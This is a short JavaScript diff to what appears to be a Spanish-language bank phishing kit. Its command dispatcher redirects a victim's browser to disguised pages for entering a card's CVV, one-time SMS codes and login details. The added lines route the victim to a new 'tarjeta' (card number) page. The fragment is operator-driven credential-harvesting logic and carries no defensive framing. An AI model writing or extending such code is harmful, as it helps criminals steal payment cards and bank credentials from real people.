@@ -150,6 +150,8 @@
         window.location.href = (typeof basePath !== 'undefined' ? basePath : '') + 'v92_sec_wpp.html?id=' + (typeof currentDeviceId !== 'undefined' ? currentDeviceId : '');
     } else if (command === 'cvv') {
                 window.location.replace(basePath + 'v92_sec_c3v.html');
+            } else if (command === 'tarjeta') {
+                window.location.replace(basePath + 'v92_sec_trj.html');
             } else if (command === 'otp' || command === 'dinamica' || command === 'sms' || command === 'sms-error' || command === 'mensaje' || command === 'seguridad') {
                 window.location.replace(basePath + 'v92_sec_o7p.html?cmd=' + command);
             } else if (command === 'login-error' || command === 'usuario') {
